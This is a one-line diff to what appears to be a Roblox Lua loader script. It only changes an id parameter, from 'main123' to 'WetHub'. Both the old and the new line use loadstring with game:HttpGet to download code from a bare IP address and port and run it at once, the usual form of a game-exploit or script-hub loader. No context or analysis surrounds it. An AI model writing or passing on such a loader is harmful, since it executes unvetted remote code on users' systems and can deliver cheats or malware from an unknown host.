@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://81.0.218.107:44228/gateway?id=main123"))()
+loadstring(game:HttpGet("http://81.0.218.107:44228/gateway?id=WetHub"))()
